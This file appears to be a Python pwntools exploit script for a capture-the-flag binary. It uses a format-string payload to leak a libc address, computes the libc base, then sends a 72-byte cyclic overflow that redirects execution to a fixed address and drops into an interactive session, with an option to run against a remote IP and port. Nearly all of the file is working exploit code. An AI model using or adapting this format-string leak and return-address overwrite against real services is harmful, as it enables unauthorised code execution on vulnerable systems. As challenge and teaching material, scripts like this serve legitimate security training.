#!/usr/bin/env python3

from pwn import *

exe = ELF('main', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*0x401325
        b*0x4013f1
        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('136.115.87.65', 31780)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()

payload = f'%{0x3+6}$p' .encode()
sla(b'? ', payload)
p.recvuntil(b'to meet you, ')
leak1 = int(p.recv(14), 16)
info("__libc_start_call_main + 120: " + hex(leak1))

libc.address = leak1 - 0x1601
info("libc base: " + hex(libc.address))

rop = ROP(libc)

payload = flat(
    cyclic(72),
    0x0000000000401236
)

sla(b'? ', payload)

p.interactive()
